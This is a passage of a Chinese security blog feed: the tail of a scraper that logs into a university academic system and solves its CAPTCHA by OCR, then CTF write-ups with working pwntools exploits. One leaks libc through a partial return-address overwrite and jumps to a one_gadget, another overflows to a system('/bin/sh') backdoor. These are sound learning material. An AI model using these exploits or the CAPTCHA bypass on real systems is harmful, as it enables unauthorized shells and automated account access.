class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ocr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'LiuLian'</span></span><br><span class="line"><span class="comment"># 测试环境Python2.7.16</span></span><br><span class="line"><span class="comment"># Create for fun!</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://jwgl.sdust.edu.cn/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.seesion = requests.session()</span><br><span class="line">        print(<span class="string">'[+] Session初始化完成!'</span>)</span><br><span class="line">        self.userAccount = raw_input(<span class="string">'请输入学号:'</span>)</span><br><span class="line">        self.userPassword = raw_input(<span class="string">'请输入密码:'</span>)</span><br><span class="line">        self.dataStr = <span class="string">''</span></span><br><span class="line">        self.safeCode = <span class="string">''</span></span><br><span class="line">        self.encoded = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_dataStr</span><span class="params">(self)</span>:</span></span><br><span class="line">        dataStrUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess'</span></span><br><span class="line">        self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content</span><br><span class="line">        print(<span class="string">'[+] dataStr 已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_safeCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        safeCodeUrl = <span class="string">'http://jwgl.sdust.edu.cn/verifycode.servlet'</span></span><br><span class="line">        safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content</span><br><span class="line">        f = open(<span class="string">'safeCode.jpg'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        f.write(safeCodeCont)</span><br><span class="line">        f.close()</span><br><span class="line">        img = Image.open(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        <span class="comment">#img.show()</span></span><br><span class="line">        img = identificationCodeHandle(img)</span><br><span class="line">        safeCode = identify(img)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'识别的验证码为: '</span> + safeCode</span><br><span class="line">        <span class="comment">#safeCode = raw_input('请输入验证码:')</span></span><br><span class="line">        os.remove(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        self.safeCode = safeCode</span><br><span class="line">        print(<span class="string">'[+] 验证码已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_encoded</span><span class="params">(self)</span>:</span></span><br><span class="line">        scode = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">0</span>]</span><br><span class="line">        sxh = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">1</span>]</span><br><span class="line">        code = self.userAccount + <span class="string">'%%%'</span> + self.userPassword</span><br><span class="line">        encode = <span class="string">''</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(code):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">20</span>:</span><br><span class="line">                encode += code[i:i + <span class="number">1</span>] + scode[<span class="number">0</span>:int(sxh[i:i + <span class="number">1</span>])]</span><br><span class="line">                scode = scode[int(sxh[i:i + <span class="number">1</span>]):len(scode)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encode += code[i:len(code)]</span><br><span class="line">                i = len(code)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.encoded = encode</span><br><span class="line">        print(<span class="string">'[+] encoded已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        loginUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon'</span></span><br><span class="line">        self.get_dataStr()</span><br><span class="line">        self.get_safeCode()</span><br><span class="line">        self.get_encoded()</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">'encoded'</span>: self.encoded,</span><br><span class="line">            <span class="string">'RANDOMCODE'</span>: self.safeCode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            html = self.seesion.post(url=loginUrl, data=login_data, headers=self.headers).content</span><br><span class="line">            <span class="keyword">if</span> html.find(<span class="string">'&lt;title&gt;学生个人中心&lt;/title&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[+] 登录成功! :)\n姓名、学号如下:'</span>)</span><br><span class="line">                pattern = <span class="string">r'&lt;div id="Top1_divLoginName" class="Nsb_top_menu_nc" style="color: #000000;"&gt;(.+?)&lt;/div&gt;'</span></span><br><span class="line">                name_num = re.findall(pattern=pattern,string=html)[<span class="number">0</span>].decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                print(name_num)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> html.find(<span class="string">'&lt;font color="red"&gt;验证码无效,请重新登录!&lt;/font&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[-] 验证码输入错误 :(,请重试该程序...'</span>)</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 登录失败 :( ,正在尝试重新登录...'</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_class_schedule</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"获得学期理论课表并展示"</span></span><br><span class="line">        class_schedule_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xskb/xskb_list.do?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line">        f = open(<span class="string">'schedule.html'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        html = self.seesion.get(url=class_schedule_url, headers=self.headers).content</span><br><span class="line">        f.write(html)</span><br><span class="line">        f.close()</span><br><span class="line">        webbrowser.open(<span class="string">'schedule.html'</span>)</span><br><span class="line">        <span class="comment"># os.remove('schedule.html')</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Teacher_evaluation</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"进行教师评价"</span></span><br><span class="line">        evaluation_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xspj/xspj_find.do?Ves632DSdyV=NEW_XSD_JXPJ'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Robbing_class</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"抢课"</span></span><br><span class="line">        robbing_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xsxkRedis/xklc_list?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test = Spider()</span><br><span class="line">    test.login()</span><br><span class="line">    <span class="comment">#test.get_class_schedule()</span></span><br></pre></td></tr></table></figure><p>测试发现，这个代码对m和n的识别度较差，其他都很好，总体识别成功率还是有80%左右的。</p><h1 id="0x03-Maybe-have-more"><a href="#0x03-Maybe-have-more" class="headerlink" title="0x03 Maybe have more"></a>0x03 Maybe have more</h1><p>完成登录以后就可以嘿嘿嘿了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/LTLKY6WF23%5B%60ND%5BK%5BO0E%60LU.gif" alt></p><p>最后吐槽一句：<code>垃圾强智系统爬爬爬</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_74923720_20190810_124148.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://liul14n.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>一道有(我)意(好)思(菜)的stack题目</title>
    <link href="http://liul14n.top/2020/03/29/%E4%B8%80%E9%81%93%E6%9C%89-%E6%88%91-%E6%84%8F-%E5%A5%BD-%E6%80%9D-%E8%8F%9C-%E7%9A%84stack%E9%A2%98%E7%9B%AE/"/>
    <id>http://liul14n.top/2020/03/29/一道有-我-意-好-思-菜-的stack题目/</id>
    <published>2020-03-29T13:31:55.000Z</published>
    <updated>2020-03-29T13:52:27.064Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_78972967_20200125_131238.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是大佬发我的题目，看名字挺easy，但是做起来却是…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/3930e380f3d08436.jpg" alt></p><p><strong>由于<code>Rules</code>的规定，这里不写明题目的名字以及题目的来源</strong>，这篇博文主要为了自己日后复习。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329213454.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329213649.png" alt></p><p>本以为是easy的一道rop，但是当我<code>checksec</code>以后…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329213746.jpg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>开着PIE、FULL RELRO、NX….555555，不过幸亏没开canary…</p><p>题目变得棘手起来</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329214003.png" alt></p><p>这里返回地址似乎可以利用一下，不过利用之前要先修改一下。</p><p>通过<code>disassemble 0x7ffff7a05b97</code>命令可以查看这个地址附近的反汇编</p><p>当我们执行完main的leave和ret以后</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329214338.png" alt></p><p>可以注意到，程序执行到<code>0x00007ffff7a05b97</code>，但是注意此处的前两条汇编，这是在call rax，而rax存着<code>rsp+0x18</code>的内容，来看一下<code>rsp+0x18</code>里面存的什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx $rsp+<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7fffffffdd68</span>:<span class="number">0x00005555555549c4</span></span><br></pre></td></tr></table></figure><p>里面存的是main函数的起始地址… 太巧了！</p><p>如果把原本main的返回地址<code>0x00007ffff7a05b97</code>修改为<code>0x00007ffff7a05b90</code>，那就可以让程序再次执行main函数，并且还能通过main函数里面的puts连带泄露出__libc_start_main的地址，然后one_gadget再次构造payload即可。</p><h1 id="0x02-完整EXP"><a href="#0x02-完整EXP" class="headerlink" title="0x02 完整EXP"></a>0x02 完整EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#c = process('./stack')</span></span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'**************'</span>,*****)</span><br><span class="line">elf = ELF(<span class="string">'./stack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span> + <span class="string">'\x90'</span></span><br><span class="line">c.sendline(payload)<span class="comment">#Look here,using sendline</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'aabbbbbbbb'</span>)</span><br><span class="line">addr = u64(c.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_start_main = addr + <span class="number">7</span> - <span class="number">231</span></span><br><span class="line">libcbase = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">success(hex(libcbase))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(libcbase + <span class="number">0x4f2c5</span>)<span class="comment">#one_gadget</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>exp中注释的位置用的sendline，这也是因为main的<code>read_n</code>函数是如下代码</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200329214944.png" alt></p><p>这也使得<code>\n</code>或者<code>\x00</code>不会覆盖掉其他地方。</p><p>由于<code>Rules</code>的规定，remote里的host和port这里不写出来。</p><p>确实挺有意思的一道题目，奇怪的知识增加了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_78972967_20200125_131238.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://liul14n.top/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>[BJDCTF 2nd]</title>
    <link href="http://liul14n.top/2020/03/21/BJDCTF-2nd/"/>
    <id>http://liul14n.top/2020/03/21/BJDCTF-2nd/</id>
    <published>2020-03-21T08:18:42.000Z</published>
    <updated>2020-03-23T19:27:50.645Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/70858371_p0.jpg" alt></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>菜是原罪</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><p>下载下来是个压缩包，解一下伪加密，得到一个名为Secret的文件，16进制查看以后发现存在<code>IHDR</code>这个Png文件的标志位，故推测这是个png文件，但缺少了头部的<code>89 50 4E 47</code>这四个字节，补齐，改拓展名为png即可，可以看到一堆HEX,转ASCII即为flag。</p><h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>改一下IHDR就能看到flag</p><h2 id="Easybaba"><a href="#Easybaba" class="headerlink" title="Easybaba"></a>Easybaba</h2><p>binwalk一下，发现有zip，提取出来，里面有个<code>里面全是出题人.jpg</code>，实际上这是个avi文件，然后avi抽帧，有好多二维码，每个二维码能扫出来一部分flag，组合起来是一串base16，解码得到疑似flag的字符串，看着像栅栏，但实际上不是，但是都是单词。。。还有很明显的恶搞意味，修改修改顺序就得到flag。</p><p><code>BJD{imagin_love_Y1ng}</code></p><h2 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h2><p>16进制查看器打开以后搜BJD即可。。。</p><h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>这题已吐…看着WP都难搞……</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323225648.png" alt></p><h2 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h2><p>这道题目相比于其他脑洞杂项题，还是有一些可以学习的新知识点的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323232227.png" alt></p><h2 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h2><p>套娃题目，全当练算法了，WP说压缩了300层。。。。也就是300层套娃。。。压缩包的名字就是解压密码。。。</p><p>有个坑点…这些都是<code>zip</code>，但拓展名都是<code>tar.gz</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">path = <span class="string">'C:\\Users\\LiuLian\\Desktop\\test\\'</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">t0 = time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line">        zip = zipfile.ZipFile(path+name,<span class="string">'r'</span>)</span><br><span class="line">        newfilename = zip.namelist()[<span class="number">0</span>]</span><br><span class="line">        pwd = name.replace(<span class="string">'.tar.gz'</span>,<span class="string">''</span>)</span><br><span class="line">        zip.extract(newfilename,path,pwd)</span><br><span class="line">        zip.close()</span><br><span class="line">        os.remove(path+name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] error or finished!'</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'总共运行了'</span> + str(t1-t0) + <span class="string">'秒'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'总共套了'</span> + str(count) + <span class="string">'层娃'</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] error or finished!</span><br><span class="line">总共运行了22.1809999943秒</span><br><span class="line">总共套了298层娃</span><br></pre></td></tr></table></figure><p>运行就能拿到一个名为flag的文件，里面就是flag。</p><p>脚本都跑了二十二秒多…. 手动解压的话估计要累到死。。。</p><p>运行结果显示总共套了298层娃。。。。</p><h2 id="Imagin开场曲"><a href="#Imagin开场曲" class="headerlink" title="Imagin开场曲"></a>Imagin开场曲</h2><p>挺有意思的杂项，就纯听力题…</p><p>不过通过这个题了解到一个挺好玩的东西叫<code>Mikutap</code></p><p><code>BJD{MIKUTAP3313313}</code></p><hr><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA加载,<code>Shift+F12</code>即可看到flag。。。。。。</p><h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>这题考察汇编。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165207.png" alt></p><p>但一些代码被IDA识别为数据了，按C还原为代码，即可看到程序的逻辑</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165245.png" alt></p><p>所以对这个字符串<code>]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;</code>进行与0x1f异或的操作即可</p><p>flag: <code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p><hr><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本次CTF的pwn题大部分都是<code>Ubuntu19.04</code>的，libc是<code>libc-2.29.so</code>，但通过<code>patchelf</code>依然可以在其他版本的U buntu上进行本地调试。</p><h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>存在后门函数<code>0x804858B dl_registery()</code>调用<code>system(&#39;/bin/sh&#39;)</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183154.png" alt></p><p>main函数的read处没有栈溢出，接着看<code>name_check</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183226.png" alt></p><p>这里的strcpy可以操作一波，但是需要先绕过前面的长度检测，来看一下汇编</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183321.png" alt></p><p>可以看到这里，调用完<code>strlen</code>以后长度保存在eax中，而这里是令<code>v3 = al</code>然后再进行的长度验证，也就是说真正验证的是长度的低字节。</p><p>所以就可以先构造好<code>payload</code>，然后<code>payload = payload.ljust(size,&#39;a&#39;)</code>,size取0x104<del>0x108或者0x204</del>0x208或者… 只要让它低字节在0x04~0x08之间即可，当然也不能超过read的size。<strong>还有一点需要注意，sendline相比send要多出一个\n，这也占size的。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">c = process(<span class="string">'./r2t3'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',29366)</span></span><br><span class="line">backdoor = <span class="number">0x804858B</span></span><br><span class="line"><span class="comment">#gdb.attach(c,'b * 0x80485E1')</span></span><br><span class="line">c.recvuntil(<span class="string">'Please input your name:\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">payload += <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">payload += p32(backdoor) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">'a'</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序保护全开</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321162955.png" alt></p><p>但是在<code>init函数</code>里面存在一个leak，泄露了printf的地址，而且题目也提供了libc，所以可以泄露出libcbase</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321163330.png" alt></p><p><code>main函数</code>也格外的和谐，直接读入<code>one_gadget</code>然后调用…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> one_gadget libc<span class="number">-2.29</span>.so </span><br><span class="line"><span class="number">0xe237f</span> execve(<span class="string">"/bin/sh"</span>, rcx, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe2383</span> execve(<span class="string">"/bin/sh"</span>, rcx, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx 